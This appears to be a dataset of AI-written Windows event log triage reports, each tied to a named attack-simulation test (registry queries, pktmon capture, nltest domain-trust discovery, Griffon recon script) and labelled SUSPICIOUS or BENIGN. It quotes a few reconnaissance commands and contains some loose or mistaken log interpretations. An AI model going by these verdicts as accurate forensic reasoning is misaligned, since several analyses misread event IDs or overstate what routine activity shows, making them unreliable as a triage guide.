   - There is no direct indication of privilege escalation, but regular high-integrity level usage indicates the account has significant privileges.
   - There are multiple log events indicating the use of a virtual account with elevated privileges.

4. **Network Time Manipulation**:
   - The system log suggests slight manipulation of system time by `svchost.exe`, which could be part of normal time synchronization with an NTP server or potentially malicious if used to obscure the timeline of events.

5. **Other Observations**:
   - Logs from standard Windows services indicate normal activity (e.g., Microsoft's Edge Service stopping), which do not appear related to the suspicious activities.
   - Multiple security audits show attempts to read credential information (ID 5379), though they display failures, which would be important in a case of potential data theft or reconnaissance.

**Threat Assessment and Conclusion**:
The activity in the logs is suspicious, particularly the use of command-line and script-driven information gathering tools. The execution of scripts to collect registry, network, and security information may indicate lateral movement preparation or reconnaissance. However, there are no conclusive results suggestive of a direct and active compromise, such as data exfiltration or malware execution.

**Resolution**: **SUSPICIOUS**

This activity needs further investigation:
- Analyze correlated activities across network logs for signs of unusual data export.
- Conduct an internal check for the legitimacy of the scripts/task schedules used.
- Review the permissions and activities of the ""admin_test"" user account.
- Consider broader endpoint detection and monitoring to capture any potential malicious scripts or processes more accurately.

Next steps include analyzing any suspicious network traffic, reviewing user access logs, and confirming the legitimacy of scheduled tasks and scripts used during this timeframe."
WinPwn - Dotnetsearch,"Upon detailed analysis of the provided event logs, the following points surface:

1. **Windows Time Change Events**:
   - The repeated changes in the system time (`EventID: 1` in the System log and `EventID: 4616` in the Security log) is noteworthy. While a single time change might be part of routine adjustments, multiple changes within close timestamp intervals without any clear system maintenance or update indication could point towards malicious attempts to evade detection or manipulate time-sensitive activities.

2. **PowerShell Execution**:
   - The Windows PowerShell log (`EventID: 600`) indicates the execution of a script downloaded from a potentially suspicious location: `https://raw.githubusercontent.com/script`. Such indications should immediately raise a flag due to the common tactic of downloading and executing scripts from external sources (a frequent method seen in malware deployments).

3. **Sysmon - Process Executions**:
   - Various EdgeUpdate processes executed with different command lines (e.g., `/ping`, `/regserver`) as seen across `Sysmon logs`. While this can be routine for legitimate software updates, the observed frequencies and variations in command lines merit further scrutiny, especially checking these updates' legitimacy.

4. **Unusual Edge Update Installations**:
   - Consistent logging of `MicrosoftEdgeUpdate` and `MicrosoftEdgeUpdateComRegisterShell64` in the Sysmon logs may suggest either a typical updating process or an unwanted software/install attempt disguised as a legitimate update.
   
Based on the above findings:

- **Assessment**: The PowerShell activities and unusual frequent time changes are indicative of potentially suspicious behavior. The execution of scripts from unknown web locations is particularly concerning and aligns with malicious tactics such as fileless malware attacks, while unexplained time changes could suggest manipulation attempts.

- **Resolution**: **SUSPICIOUS** – The logs contain activity, particularly the PowerShell script execution from an external URL and the unusual system time changes, that appear unusual and necessitate further investigation to determine the intent and any operational impact or compromise.

**Guidance**: 
  - Immediately scrutinize and verify the integrity and intent of the PowerShell script sourced from the external URL.
  - Investigate the cause and necessity of the frequent system time changes and correlate with user or system activities for relevance.
  - Maintain a heightened alert for further anomalous activities and deploy threat detection measures that could help capture ongoing malicious processes.
"
Display group policy information via gpresult,"To analyze the provided Windows event logs, we'll assess each type of log for any suspicious or anomalous behavior.

### 1. **Application Logs:**
- The logs indicated activity related to the `edgeupdate` and the `Microsoft-Windows-Security-SPP` (Software Protection Platform Service). These logs show service stops and rules engine activity, which appear common for this service.

### 2. **Security Logs:**
- The primary concern here is Event ID 4616, which indicates system time changes. It appears the time was reset to an earlier time (`PreviousTime` > `NewTime`). Time changes can be used by attackers to hinder log correlation or to bypass time-based security controls. However, note that these time changes are often carried out by legitimate processes for synchronization purposes, particularly by services running under LOCAL SERVICE and the svchost.exe process.

### 3. **Sysmon Logs:**
- Most Sysmon logs relay typical execution of processes like `whoami.exe`, `cmd.exe`, and `gpresult.exe` by a user with high integrity level. These processes are commonly used for user information and system status checks:
  - `whoami.exe` was run several times, which could be an indication of normal administrative activity or a prelude to privilege escalation, depending on the context.
  - `cmd.exe` executed with the `/c gpresult /z` command, suggesting a user is querying detailed group policy information, which could indicate troubleshooting or advanced configuration checks.
  - The sequence of Edge Update processes is consistent with software update or installation activities. These involve various `MicrosoftEdgeUpdate.exe` processes running under SYSTEM, including tasks related to registration and update services.
  - The use of `wevtutil.exe` implies interaction with Windows event logs, possibly for viewing or exporting logs, typically benign unless accompanied by other suspicious activities.

### 4. **System Logs:**
- The system logs confirm the time adjustments seen in the security logs. The time changes are conducted by the `Microsoft-Windows-Time-Service` via NTP (Network Time Protocol), pointing to potential benign reasons such as time synchronization.

### 5. **Windows PowerShell Logs:**
- There are no entries to assess, hence any suspicious PowerShell activity is presumed absent from this dataset.

### **Assessment:**
- **Suspicious Elements:**
  - The repeated changes in system time could potentially be used in obfuscating log events; however, they appear synchronized with legitimate NTP server interactions.
  
- **Benign Elements:**
  - The Edge Update activities are consistent with software update operations which are typical for software maintenance.
  - Usage of command line tools (`whoami`, `gpresult`, and `wevtutil`) are typical for system audits and maintenance tasks.

### **Resolution: SUSPICIOUS**
While no outright malicious activity is evident, the frequent system time alterations (Event ID 4616) warrant further investigation to rule out time-based tampering. Correlating with other network logs, endpoint analysis, and user behavior may shed light on any unauthorized activities.

### **Guidance:**
- **Further Investigation:**
  - Verify if any unauthorized users have altered time settings.
  - Correlate time changes with user login/logoff events, or with any alerts in Intrusion Detection Systems (IDS).
  - Review administrative actions and baseline them against routine scheduled maintenance activities such as software updates reflected in the logs.
- **Monitoring:**
  - Continue monitoring system times and related logs for any unexpected changes.
  - Leverage threat intelligence to update and ensure NTP interactions are sourced from trusted servers.

By further scrutinizing and correlating these with other log sources and potential alerts, one could arrive at a more comprehensive security posture evaluation."
Query Registry,"Upon analyzing the provided Windows event logs, here are my findings:

### Sysmon Logs

1. **Numerous Registry Queries by `cmd.exe`:**
   - There are multiple instances where `cmd.exe` is executing a series of `reg query` commands. This behavior can be indicative of a script or a process attempting to enumerate registry entries, potentially for reconnaissance or persistence techniques such as finding startup entries or checking for specific software configurations. This action mainly involves a user `SERVER002\\admin_test`.
   - These queries are extensive and cover several registry paths typical for startup entries and user environment configurations:
     - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify` 
     - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
     - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
   - Running these commands via `cmd.exe` suggests it could be automated via a script.

2. **Use of `wevtutil.exe` and `conhost.exe`:**
   - The presence of `wevtutil.exe` and `conhost.exe` commands executed repeatedly within a short time frame raises a suspicion about event logs being accessed or cleared using `wevtutil.exe`. This could potentially be an attempt to hide traceable actions, though not confirmed in this log set.
   - The user executing these actions is `SERVER002\\admin_test`, which is an administrative account, further increasing the possibility of anomalous activity given the potential for improper usage.

3. **Legitimate System Processes:**
   - Processes like `WmiPrvSE.exe`, `wuauclt.exe`, and `MoUsoCoreWorker.exe` appear to be executing normally as part of system updates and WMI operations. Multiple executions of Microsoft Edge update processes are also noted, which match typical activity during software updates.

### Security Logs

- **Credential Access Failures:**
  - There are several `EventID 5379` audit failures indicating attempts (possibly automatic) to use credentials for Microsoft accounts. Though they resulted in failure codes, such activities are worth noting as they could be attempts at credential theft or unauthorized access.

### System Logs

- **Security Intelligence Update:**
  - The Windows Update Client logs correspond to the installation of security updates, which align with the update processes seen in Sysmon logs.

### Conclusion

Based on the analysis, the logs present a clear indication of potentially **suspicious** behavior centered around the enumerative registry queries executed via `cmd.exe` and event log access via `wevtutil.exe`. Although some sections of the logs represent legitimate system updates and operations, the unusual registry queries and potential log manipulation warrant further investigation.

### Resolution: SUSPICIOUS
The activity is neither conclusively benign nor outrightly malicious. It requires further investigation to determine the context of the `cmd.exe` and `wevtutil.exe` usage, including a review of scripts or scheduled tasks that might be executing these commands. A review of the `admin_test` account's activities and permissions should also be conducted."
Environment variables discovery on windows,"Upon reviewing the provided Windows event logs, here is my detailed analysis:

### System Log:
- **Time Change Events**: Multiple events indicate a time change on the system by the `svchost.exe` process. Windows time changes, especially performed by `svchost.exe` under the `LOCAL SERVICE` account, are typically routine operations when synchronizing with an NTP server. 
- **Summary**: No suspicious activity is detected from time changes as they appear to be regular and intended behavior.

### Security Log:
- **Ticket Privilege Elevation**: Event ID 4672 logs show that the user `admin_test` has been granted a set of privileges associated with administrative operations (SeSecurityPrivilege, SeBackupPrivilege, etc.). The granting of these privileges could indicate potential administrative actions or audits.
- **Login and Logout Events**: Event IDs 4624 and 4634 show successful logins and logouts for `admin_test` using NTLM authentication, which is normal behavior for system administrators.
- **Summary**: While elevated privileges are worth noticing, they are typical for administrative accounts. But it might need more scrutiny if these were unscheduled actions.

### Sysmon Log:
- **Process Execution**: Frequent execution of `wevtutil.exe` and `cmd.exe` by user `admin_test`. `wevtutil.exe` is typically used for managing event logs, while `cmd.exe` can be used for a myriad of legitimate tasks.
- **Script Execution (cmd.exe with /c set)**: Shows a command executed through the Windows shell, which doesn't necessarily indicate malicious activity but could be suspicious if the context is unknown.
- **Use of Exes like `whoami.exe` and `hostname.exe`**: These are legitimate Windows utilities used for checking logged-in user and hostname information. Their execution could be related to standard administrative scripting.
- **Other Services/Processes**: Regular Windows system processes like `MicrosoftEdgeUpdate.exe`, `sppsvc.exe`, and `TiWorker.exe` are logged. These are usual services with no indication of malicious activity.
- **Summary**: The consistent execution of `system32` utilities suggests either administrative activity or scripted monitoring. Without context, it doesn't explicitly look malicious but warrants further verification.

### PowerShell Log:
- **Absence of Events**: There were no entries provided in the Windows PowerShell log. This absence can suggest there was no PowerShell activity worth noting or indicating suspicious behavior during the reviewed period.

### Application Log:
- **Software Protection Events**: These relate to software licensing and protection, regular in nature, unless frequent failures are witnessed, which is not the case here.

### Overall Assessment:
- **Potential Indicators**: The events log primarily reflects scheduled administrative activities or monitoring scripts running on the system. Elevated privileges, consistent with an admin account, accompany all activities, and no unauthorized accesses or distinctly malicious signatures are present in the data.
- **Actionable Recommendation**: There should be an inquiry to confirm if `admin_test` activities were scheduled and authorized, ensuring that any scripts or tools used were intended and executed as part of regular maintenance or monitoring operations.
  
### Resolution: 
**SUSPICIOUS** - The logs contain activities consistent with administration or scripted automation but lack explicit malicious intent. Further investigation should confirm authorization and intent for the activities observed, especially concerning privilege use and command execution."
Enumerate Root Domain linked policies Discovery,"### Detailed Analysis of Logs

**Security Log:**
- The security logs contain events related to the system time change (EventID 4616). Time changes can be legitimate, associated with synchronization services such as Windows Time Service, or they may indicate malicious activities like anti-forensics. However, these time change events are executed by svchost.exe running under LOCAL SERVICE, which is considered typical for legitimate time sync operations.

**Windows PowerShell Log:**
- The PowerShell logs indicate command execution through PowerShell scripts. The script captured seeks to query domain policy paths and names, leveraging ADSI. This could be a legitimate administrative task; however, the presence of a seemingly obfuscated script and the absence of context (e.g., the initiator or purpose) raise a red flag. The command executed doesn't perform destructive or obviously malicious actions, but it could represent reconnaissance.

**Application Log:**
- Logs include routine Microsoft Edge update processes. Nothing suspicious or deviant is observed in these logs. The updates are part of normal application maintenance.

**Sysmon Log:**
- Multiple instances of utilities like wevtutil.exe, conhost.exe, hostname.exe, and whoami.exe are observed, executed by the user `SERVER002\admin_test`. These commands/services are consistent with diagnostic or scripting activities. 
- The presence of a PowerShell process run by `SERVER002\admin_test` appears to align with events in the PowerShell logs which could indicate that a user is performing remote administration tasks.
- A vast number of Microsoft Edge Update processes are running, which are typical for application updates. Each relevant process in the Sysmon log is associated with `NT AUTHORITY\SYSTEM`, denoting legitimate system account activity.

**System Log:**
- Similar to the Security log, the System log entries are predominantly about time change updates. The events don’t deviate from the expected kernel and service operations.

### Assessment of the Situation

- **Suspicious Activity:**
  - The primary suspicious aspect involves the PowerShell script running seemingly obscure commands for querying Active Directory domain policies. While not inherently malicious, the lack of context (e.g., no direct user context in the logs to verify operator intentions) makes this worth deeper examination.

- **Benign Activity:**
  - The majority of the entries, including system time changes and application updates, align with expected system operations.

### Resolution

Given that most activities are aligned with routine maintenance, updates, and system operations, but considering the potential for the PowerShell activity to represent reconnaissance or unauthorized information gathering:

- **Resolution: SUSPICIOUS**

### Recommendations

1. **Further Investigation:**
   - Identify the initiator of the observed PowerShell script. Check correlating user logs for anomalous logon activities or context confirming administrative intentions.
   - Review any network logs for communications following the PowerShell activity, which could suggest lateral movement or data exfiltration.

2. **User Confirmation:**
   - Confirm with any system administrators if they ran or authorized the PowerShell script for legitimate domain management tasks around the logged time.

3. **Enhance Monitoring:**
   - Implement alerting for specific PowerShell commands known for reconnaissance or lateral movement to maintain robust detection capabilities against potential threats.

By focusing on these areas, you can better contextualize the PowerShell activities and discern between benign administrative tasks and potential starter actions of a malicious campaign."
Enumerate Linked Policies In ADSISearcher Discovery,"Upon analyzing the provided event logs, here's a breakdown of the observations and findings:

### Security Logs
- **Event ID 4616**: Time change events are captured. The local service account (`LOCAL SERVICE`) on `svchost.exe` modified the system time back and forth within a few seconds. Time adjustments on their own might not be suspicious, but frequent or unexplained changes could indicate attempts to manipulate log timestamps or other time-based activities.

### Sysmon Logs
- **Event ID 5**: Several executions of `wevtutil.exe` (Windows Event Utility) and `conhost.exe` (Console Host) under the user `SERVER002\admin_test`. These utilities manage and interact with Windows Event Logs and the terminal console, respectively. Regular usage by an admin account is typically benign unless used in conjunction with suspicious activity.

- **Event ID 1**: Multiple executions of `MicrosoftEdgeUpdate.exe` can be seen. This executable is part of the Microsoft Edge update service. However, the frequency and consistency of these updates could be seen as relatively normal for periodic system maintenance, barring any signs of tampering or additional suspicious activity.

- **Execution of `powershell.exe`**: A particularly sophisticated PowerShell script was executed. The script seems to perform Active Directory and group policy enumeration activities, which could be legitimate administrative actions, but can also be potentially suspicious if not typically performed by this user or if this is unexpected behavior.

### Windows PowerShell Logs
- **Event ID 600**: These events indicate the script's execution mentioned in the Sysmon logs, confirming that a complex PowerShell script was indeed run, querying organizational unit information and group policies. While this can be a normal administrative task, if no authorized personnel were meant to execute it, this could indicate an information gathering attempt or reconnaissance.

### System Logs
- **Event ID 1 & 24**: Reflects the aforementioned time changes within the system. Consistent with the security logs and generally not harmful unless intended to obfuscate other activities.

### Application Logs
- **EdgeUpdate and Software Protection Service Logs**: Indicates normal service activities like the stopping and starting of services related to Microsoft Edge and software protection. These actions, if legitimately done, are typically routine.

---

### Assessment

After a review, the combination of frequent time adjustments, the PowerShell scripting activity, and the frequency of certain utility executions (like `wevtutil.exe`) under the admin context suggests preliminary signs of suspicious activities, primarily concerning the use of PowerShell which requires validation of legitimacy.

### Resolution: SUSPICIOUS

**Guidance on How to Proceed:**
1. **Confirm with IT Operations**: Verify if the executed PowerShell script was a legitimate administrative task. Check for any scheduled scripts or maintenance activities planned for that period.
2. **Correlate Account Usage**: Check login activities for `admin_test` to ensure they align with legitimate access and maintenance windows. Investigate any deviations.
3. **Review Time Change Justifications**: Determine why the system time was changed and if this was part of a known maintenance task or system correction.
4. **Create Alert for Anomalies**: Set up monitoring/alerts for similar activities in the future to ensure timely detection and response to potential threats.

These steps will help ascertain whether the activities are benign or part of a larger malicious campaign. Depending on findings, increase the security measures, especially around PowerShell execution and sensitive account monitoring."
Remote System Discovery - nslookup,"After a detailed analysis of the provided event logs, some patterns and activities stand out, which indicate suspicious behavior:

1. **PowerShell Usage**:
   - The logs show PowerShell running a script designed to iterate over IP address ranges attempting to perform DNS lookups (`nslookup`). This type of activity can be indicative of network reconnaissance, a common tactic used by attackers to identify live hosts or potential targets on a network.

2. **Sysmon Logging**:
   - Sysmon logs capture `cmd.exe` instances executing `nslookup` commands, triggered by the PowerShell script. This confirms that the PowerShell process initiated these DNS lookups, further highlighting potential reconnaissance or network enumeration activities.

3. **Elevated Privileges**:
   - The `System` and `Security` log entries display logon events with elevated privileges for the user `admin_test`. While this may be normal for administrative activities, combined with the PowerShell script execution, it deserves further scrutiny to ensure these were authorized actions.

4. **Network Reconnaissance Indicators**:
   - The script systematically queries IP addresses from a specific range, signaling a possible attempt to gather information about other devices on the network. This behavior is characteristic of a network probe.

5. **Process Execution Context**:
   - The `ADMIN_TEST` account is conducting activities with a high integrity level, which suggests that these are running with elevated privileges. This context could potentially be abused if used maliciously.

**Assessment**:
Given the nature of the observed activities, particularly the PowerShell script performing mass `nslookup` actions on local network IPs, this behavior suggests unintended network reconnaissance has been conducted on `Server002`. Such actions are frequently associated with unauthorized scanning of networks to collect information on active devices and potential vulnerabilities.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct a further investigation to determine the source and authorization of the PowerShell script. Check if this was a scheduled task, a manually executed script by the user, or potentially part of automated system operations.
- Review activities associated with the `admin_test` account during this time window to rule out malicious intent or unauthorized access.
- Alert system administrators or the incident response team to monitor for subsequent suspicious activities and evaluate the system's security controls and monitoring policies to detect similar events more efficiently.
- Consider reassessing user privileges and implementing stricter auditing and logging policies around script execution, especially those using administrative privileges."
Security Software Discovery,"Upon reviewing the provided Windows event logs, I have conducted a detailed analysis focusing on any signs of suspicious activity that might indicate a compromise or malicious behavior. Here's the assessment:

### System Log

1. **Time Change Events**:
   - Events show the system time being changed slightly, but the exact reasons are not detailed. The change is minimal and could be part of normal system operations or automatic time synchronization processes.

2. **Process Activity**:
   - There are multiple instances of `svchost.exe` responsible for time synchronization, which is commonly used for legitimate operations involving multiple system services.
   - The services involved are running under ""LOCAL SERVICE"", which is expected for system services.

### PowerShell Log

1. **PowerShell Execution**:
   - Execution of PowerShell commands such as `Get-Process` and `Get-Service` focusing on identifying processes and services related to `Sysmon`. These are standard administrative checks but can be suspicious if not executed by authorized administrators.
   - Commands checking for pattern existence in processes (e.g., virus, defender, etc.) which are used for monitoring and could be part of legitimate security workflow, but could also be indicative of reconnaissance activities.

### Application Log

1. **Edge Updates**:
   - Logs related to the Microsoft Edge Update, including service start and stop, appear normal for Edge updates.

### Sysmon Log

1. **Command Execution**:
   - Multiple instances of command-line utility executions (`whoami.exe`, `cmd.exe`, `tasklist.exe`, `conhost.exe`, `netsh.exe`, `WindowsPowerShell.exe`) conducting detailed scans for system process and firewall rules. This could indicate security auditing but could also indicate an anomaly if unauthorized.
   - Particularly, `cmd.exe` was used for an extensive list of actions, including listing firewall profiles, checking for security software presence, and gathering process information, which could be legit under a security audit context but suspicious otherwise.

2. **Edge Update Executions**:
   - Extensive process creation under `C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\`. This is consistent with legitimate software update activity for Microsoft Edge.

### Security Log

1. **Time Change**:
   - Logs indicating time changes alongside the system log, showing activation by `svchost.exe`.

### Assessment

- **BENIGN**: The majority of activity could be associated with legitimate system and security functions. The processes, though extensive in query for security services, could be consistent with system administration practices, especially related to Sysmon monitoring and system auditing.
- **SUSPICIOUS**: While activities might be part of a legitimate security audit or administrative control, the breadth and multiplicity of checking for security software, firewall settings, and process enumeration could suggest a reconnaissance behavior if not authenticated by known administration action.

### Resolution

Finalizing the investigation, the logs indicate **SUSPICIOUS** activity that requires further inquiry. The execution of multiple PowerShell and command-line audits/tests suggests potential reconnaissance which should be verified against administrative activity records to ensure these actions were legitimately executed by authorized personnel. It is advisable to:
- Verify the origin and intent of administrative commands.
- Cross-reference with user activity logs to confirm administrative legitimacy.
- Enhance monitoring for any unauthorized or high-privilege command executions moving forward."
System Time Discovery - PowerShell,"After reviewing the provided Windows event logs, here's a detailed analysis of the events and processes that stood out:

1. **Software Protection Platform Service**: The event in the Application log indicates an action by the Software Protection Platform, which is normal for a Windows environment and ensures license compliance. No immediate indicators of compromise here.
   
2. **Edge Update Activity**: The Application and Sysmon logs show the Microsoft Edge Update service activities, such as service starts, stops, and updates. This sequence of events appears normal due to Edge's regular update checks and operations. These operations are executed under ""NT AUTHORITY\SYSTEM,"" maintaining system integrity, and are consistent with legitimate Microsoft Edge updating processes.

3. **Execution of System Utilities**: 
   - Wevtutil.exe: This utility is used for managing Windows Event logs. Occurrences under the user 'SERVER002\admin_test' are noted, but not necessarily suspicious, unless seen in combination with other compromising activities like unauthorized log clearance or unusual timing, which is not evident here.
   - Conhost.exe: This generally supports command-line interfaces. Its repeated invocations following wevtutil and whoami are typical due to its role in creating console windows.
   - Hostname.exe and Whoami.exe: These executions are benign unless found in conjunction with unknown or unauthorized commands, which is not noted here.

4. **PowerShell Activity**: 
   - The PowerShell logs include an execution of a command `powershell.exe & {Get-Date}`, indicating an attempt to retrieve the current date. This can be typical or scripted activity, not inherently malicious unless tied to an unauthorized script or user.
   
5. **Service and Kernel Activities**:
   - Time synchronization with an NTP server is noted, which is a common and necessary process for timekeeping on the server.
   - svchost.exe and sppsvc.exe (Service Host and Software Protection Service) activities align with their expected roles in service hosting and ensuring licensing compliance, with no sign of abusive execution or unauthorized access.

6. **Security Log Entries**: These are primarily concerned with time change events on the system, which occurred through legitimate service processes, with no unauthorized users involved.

**Assessment**: 
- The activities observed within these logs predominantly indicate routine Windows operating system and application management tasks. There is no direct evidence of privilege escalation, unauthorized command execution, or any other hallmark of a system compromise in these logs.

**Resolution**: 
- **BENIGN**: The logs contain benign activity consistent with expected system operations and updates. No further action required on this activity set. However, continued monitoring and standard security practices should remain in place to detect any future anomalies."
Windows Internal pktmon capture,"Upon reviewing the provided Windows event logs, several activities stand out as potentially suspicious and warrant further investigation. Here's a breakdown of the analysis:

1. **Multiple Instances of `PktMon.exe` Initiation:**
   - The logs detail the execution of the `PktMon.exe` utility, which is a network packet monitoring tool. The use of such a tool implies logging and monitoring of network traffic, typically not a routine task for average users and suggests a more deliberate investigation or interception activity on the network. This could either be part of legitimate administrative activity or potentially indicate preparation for data exfiltration or covert monitoring. 

2. **Elevation of Privileges:**
   - The logs show numerous entries associated with `admin_test`, which include EventID 4672 (Special privileges assigned to new logon) with a list of high-level privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This level of access could be a regular configuration for the admin_test account; however, it needs verification and alignment with organization policies to ensure it is not unusual.

3. **Execution Context and Logs:**
   - The `cmd.exe` is executed with complex command line arguments which include the use of `PktMon.exe`, redirection operators, and timeout functions (`/c pktmon.exe start --etw  -f %TEMP%\\data.etl &amp; TIMEOUT /T 5 &gt;nul 2&gt;&amp;1 &amp; pktmon.exe stop`). These activities could indicate automation scripts being run. The thoroughness suggests preparation and a need for stealth.

4. **Frequent Accessing of `wevtutil.exe` and `conhost.exe`:**
   - These utilities are seen being executed multiple times. `wevtutil.exe` is generally used to manage event logs, and its repeated use in a short time span can suggest log tampering or detailed monitoring. `conhost.exe`, a legitimate process for console window management, could be benign in this context or signify interaction with command-line tools.

5. **System Update Processes:**
   - Entries related to Microsoft Edge updates are visible. These appear standardized and consistent with routine application update activities (e.g., Microsoft Edge installer processes), executed by the `NT AUTHORITY\SYSTEM` user. They appear legitimate.

**Assessment:**

Based on these observations, the activities in the logs are marked as **SUSPICIOUS**. The `PktMon.exe` executions and privilege escalation activities necessitate validation, especially to confirm whether they align with expected administrative duties or if they denote preparations for malfeasance or security threats. 

**Guidance:**

1. **Verify Authorization:**
   - Confirm whether the `admin_test` account has the appropriate authorization for such high-level privilege accesses and use of monitoring utilities like `PktMon.exe`.

2. **Context and Purpose of Actions:**
   - Contact the administrator(s) to verify the intent behind the use of `PktMon.exe`. Clarify if it is part of routine network diagnostics or necessitated by a specific incident.

3. **Correlate with Other Logs/External Threat Intels:**
   - Check against other logs, such as network logs, for unusual outgoing connections or volume surges coinciding with `PktMon.exe` activity. Consult threat intelligence sources for known indicators associated with data exfiltration methods.

4. **Detailed User Activity Audit:**
   - Conduct a thorough audit of recent activities associated with `admin_test` to check for any out-of-character behavior or access to sensitive resources.

Final resolution is **SUSPICIOUS**, indicative of potential risks needing more information to conclude further actions."
Griffon Recon,"Upon analysis of the provided Windows event logs, the following points summarize the findings:

1. **Suspicious PowerShell Execution:**
   - The Windows PowerShell logs indicate the execution of a script using `cscript` to run a `.vbs` file located in a temporary directory: `griffon_recon.vbs`. This could potentially be a reconnaissance tool used by an attacker to gather information about the system.

2. **Sysmon Logs Correlation:**
   - The Sysmon logs confirm the execution of `powershell.exe` along with `cscript.exe` to run `griffon_recon.vbs`. This implies that scripts are being executed from temporary directories, which is commonly seen in malicious activities where such scripts are used for lateral movement or system enumeration.
   
3. **Usage of System Utilities:**
   - There are various `wevtutil.exe` and `conhost.exe` activities which are not necessarily malicious but should be monitored especially when correlated with suspicious scripts. These utilities can be used for event log management and, in some cases, could be utilized by attackers to clear logs or cover tracks.

4. **Integrity Level and User Context:**
   - The processes are executed with high integrity levels under the context of `SERVER002\admin_test`, which indicates that an administrative account is executing potentially harmful scripts. This raises a concern for privilege abuse or compromise.

5. **EdgeUpdate Activities:**
   - Microsoft Edge Update processes appear numerous times and though they represent routine updates, their frequency and the system authority context they operate in should be verified to ensure they are legitimate and not used as a disguise for illicit operations.

6. **Overall Analysis and Recommendations:**
   - The execution of `griffon_recon.vbs` and the use of administrative privileges to run a script from a temporary file location is highly suspicious and warrants further investigation. 
   - It is recommended to investigate the source and intent of the `griffon_recon.vbs` script, check the system for unauthorized user accounts or recent changes, review firewall and network logs for any unusual outbound connections, and confirm the integrity of the administrative user accounts and their credentials.

**Resolution: SUSPICIOUS**

There are activities that do not appear normal and need further investigation, but there isn’t enough evidence to definitively label them as malicious at this time. Continued monitoring and further forensic investigation are advised to ascertain the intentions behind these activities."
Windows - Discover domain trusts with nltest,"Upon reviewing the provided Windows event logs, I've conducted an in-depth analysis focused on identifying any suspicious or anomalous behavior that could indicate malicious activity or system compromise.

1. **Use of CMD and Execution of nltest.exe:**
   - The logs indicate the command-line execution of ""cmd.exe"" with the argument `/c WHERE nltest.exe >NUL 2>&1`, which is followed by the direct execution of ""nltest.exe"" to query domain trusts and trusted domains.
   - ""nltest.exe"" is a legitimate tool often used for network and domain management. However, the use of command line and the presence of both ""cmd.exe"" and ""nltest.exe"" commands in quick succession can be indicative of reconnaissance efforts.

2. **Processes Executed by Server Admin User:**
   - Multiple executions are recorded with the user ""SERVER002\\admin_test"" with a high integrity level, including the use of ""wevtutil.exe"", which is used to control event logs (e.g., clearing logs) and ""hostname.exe"" and ""whoami.exe"", which are typical system utility programs.
   - While these are legitimate programs, their combination and repetitive execution might imply someone gathering system information or covering tracks.

3. **Microsoft Edge Update Activities:**
   - There are numerous entries for processes under ""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate"". The activities mainly involve updating components, which are normal for maintaining software.
   - No irregularities were detected in this section, as they align with standard software updates conducted by Microsoft Edge.

4. **Service and Event Logs:**
   - EdgeUpdate service stopping as indicated by the application logs could be an expected part of the update cycle, as services typically restart after updates.
   - No critical or error entries in syslog entries that indicate system instability or intrusion attempts during the timeline of events.

**Assessment:**
The provided logs contain entries that might superficially appear suspicious due to the nature of the commands used (especially around the ""nltest.exe"" execution and fetching system information using ""whoami.exe"" and ""hostname.exe""). These activities could either represent legitimate administrative tasks or potential reconnaissance by an unauthorized individual.

Given that the logs do not present any conclusive evidence of privilege escalation, unauthorized access, or clear malicious payload execution, but still contain elements that could warrant further review, the resolution is:

- **SUSPICIOUS** - The activities observed necessitate additional investigation to verify whether these were legitimate administrative functions or potential reconnaissance activity by a malicious actor.

**Recommendation:** 
- Cross-verify these activities with the standard operational reference for the user ""SERVER002\\admin_test"".
- Consider reviewing more logs from preceding and succeeding days for any unusual patterns or potential escalation.
- Implement monitoring mechanisms to detect continued or similar patterns of execution that might indicate illicit reconnaissance or access attempts."
Permission Groups Discovery PowerShell (Local),"Upon reviewing the provided logs, we can analyze several key events across different types of logs that appear noteworthy:

1. **Time Manipulation**: 
   - Security Event ID 4616 indicates a system time change, which is often seen in attempts to deviate logs' timestamps. Such a change involves the process `svchost.exe` operating under the LOCAL SERVICE account.
   - System Event ID 1 corroborates these time changes, which use `svchost.exe` as well, suggesting a pattern that may not necessarily be malicious but should be noted for correlation with other activities.

2. **Privileged Logons and Impersonation**:
   - Security Event ID 4672 identifies the account `admin_test` receiving special privileges like SeDebugPrivilege, which can be used for administrative tasks or potentially malicious activities.
   - A subsequent logon (ID 4624) with Logon Type 3 (Network) from a workstation and using NTLM authentication suggests an administrative task potentially conducted remotely.

3. **Process Execution with PowerShell**:
   - There are numerous entries for the PowerShell process (`powershell.exe`) being used to enumerate privileges and group memberships within the system via commands like `get-localgroup` and `Get-LocalGroupMember`.
   - Sysmon Event IDs 1 and 5 also show PowerShell executing with command lines consistent with querying security group members, actions potentially indicative of reconnaissance.

4. **Multiple Instances of** `wevtutil.exe` **and** `conhost.exe` **Execution**:
   - Sysmon logs show several instances of `wevtutil.exe` and `conhost.exe` executions by `admin_test`, which are consistent with manipulation or querying of event logs (though could be legitimate, context-dependent).
   - The correlation of these processes with elevated privileges suggests possible malicious log viewing or clearing.

5. **Edge Update Processes**:
   - Sysmon logs have multiple entries indicating normal update processes for Microsoft Edge under NT AUTHORITY\SYSTEM. These appear benign and consistent with legitimate software updates.

6. **PowerShell and System Execution Logs**:
   - The PowerShell events indicate provider states changing and are generally associated with system or application state changes, consistent with the observed high-level endpoint management or auditing.
   - No abnormal operation of Windows services (like `WmiPrvSE.exe` or `TiWorker.exe`) is observed, which correlates with typical system maintenance.

### Conclusion:
While components of this activity could be legitimate system administration or maintenance work, there are indicators that suggest potential misuse:
- The manipulation of system time can indicate an attempt to disrupt log coherence.
- Execution of PowerShell commands to query security group data coupled with elevated privilege logins can be suspicious activities, associated with lateral movement or reconnaissance by an unauthorized person.

Given this possibly unusual behavior, I would classify this situation as **SUSPICIOUS**. It requires further investigation to rule out malicious intent, especially considering the administrative context and potential network-based access. Review access logs, verify the identity and purpose of `admin_test`, and check for consistency with routine operations or expected processes.

**Recommended Actions**:
- Conduct a detailed investigation into the actions performed by the `admin_test` account around the timeframe of these logs.
- Validate the necessity and authorization for system time changes.
- Verify if PowerShell activities align with known administrative scripts or tasks.
- Utilize endpoint protection tools to scan for indicators of malicious behavior.
- Consider a review of policies and settings concerning sensitive privilege allocations to ensure proper access control.

Advancing with a cautious and thorough review will help ensure the security integrity of the host system and network at large."
